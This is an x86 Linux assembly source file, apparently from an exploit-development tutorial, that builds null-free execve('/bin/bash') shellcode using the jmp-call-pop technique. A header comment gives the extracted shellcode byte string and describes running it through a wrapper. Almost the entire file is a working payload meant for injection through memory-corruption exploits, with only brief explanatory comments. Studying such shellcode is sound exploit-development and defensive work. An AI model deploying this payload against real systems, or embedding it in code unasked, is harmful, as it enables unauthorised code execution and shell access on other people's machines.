; ExecveBash.asm
; by Abatchy
;
;   NOTE: This code will segfault if compiled directly because it attempts to modify "message", which is inside the .text segment and is marked RO. Instead, export the shellcode and use a wrapper.
;
;   Shellcode generated: "\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"

global _start        ; Entry point, required for ld linker

section .text        ; Text segment, code resides here

_start:
    jmp short jmp_to_message  

jmp_back:
    pop esi         ; ESI has the address of message

    xor ebx, ebx
    mov byte [esi + 9], bl
    mov dword [esi + 10], esi
    mov dword [esi + 14], ebx

    lea ebx, [esi]
    lea ecx, [esi + 10]
    lea edx, [esi + 14]

    xor eax, eax
    mov al, 0xb     ; XORing since mov eax or mov ax will contain a null character
    int 0x80

jmp_to_message:

    call jmp_back
    message:    db "/bin/bashABBBBCCCC"
